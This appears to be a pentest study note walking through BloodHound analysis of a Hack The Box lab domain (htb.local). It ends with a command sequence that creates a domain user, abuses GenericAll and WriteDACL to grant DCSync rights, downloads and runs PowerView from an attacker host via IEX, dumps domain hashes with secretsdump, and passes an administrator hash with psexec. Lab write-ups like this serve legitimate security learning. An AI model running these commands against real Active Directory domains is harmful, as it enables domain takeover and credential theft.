# Common Usage

1. Collect the zip file and start the neo4j server with bloodhound.\
   &#xNAN;_&#x52;efer to_ [_AD Attack Surface Recon_ ](../ad-attack-recon.md)_section._&#x20;
2. (Clear previous session and database) Select a menu, scroll down to the bottom, and click on "Clear sessions" and "Clear Database".

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

3. Look at the list of menue at the right side, and select "Upload Data" menu. Select the zip file.&#x20;

![](<../../.gitbook/assets/image (51).png>)&#x20;

4. This will automatically import the zip file and parse the information for you to analyze.

<figure><img src="../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

5. Let's select settings at the right menu. You may want to adjust some settings here. You may need to enable Edge Label Display to Always Display, for example.&#x20;

<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

5. Let's go to Analysis menu and see anything you can leverage built-in rules.&#x20;

<figure><img src="../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

* SVC-ALFRESCO is a member of SERGICE ACCOUNT group, which is a member of PRIVILEGED IT ACCOUNT group, which is a member of ACCOUNT OPERATORS group.&#x20;
* The ACCOUNT OPERATORS group has 'GenericAll' privilege to EXCHANGE WINDOWS PERMISSIONS group.&#x20;
* The EXCHANGE WINDOWS PERMISSIONS group has 'WriteDACL" privilege to the HTB.LOCAL domain.&#x20;
* HTB.LOCAL domain has 'DCSync' privilege to other Domains.&#x20;

6. When you right click on one of the privilege names (for example, GenericAll below) and select "? Help", you will see more info on the privilege and abuse you can try.&#x20;

<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

7. What you could do based on the info on the privileges of GenericAll and WriteDACL above.&#x20;
   1. GenericAll known as full control of a group allows you to directly modify group membership of the group.
   2. With WriteDACL to a domain object, you may grant yourself DCSync privileges.
8. Your final commands look like below.&#x20;

{% code overflow="wrap" %}
```bash
# Add a new user to 'Exchange Windows Permissions" group
PS> net user iptracej iptracej /add /domain
PS> net group "exchange windows permissions" /add iptracej
PS> net group "exchange windows permissions"

# Assume that you have powershell session. 
PS> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/privesc/PowerView.ps1')

PS> $SecPassword = ConvertTo-SecureString 'iptracej' -AsPlainText -Force
PS> $Cred = New-Object System.Management.Automation.PSCredential('htb\iptracej', $SecPassword)

PS> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdenti
ty iptracej -Rights DCSync

Kali> impacket-secretsdump htb.local/iptracej:iptracej@10.10.10.161 

Kali> psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161

```
{% endcode %}
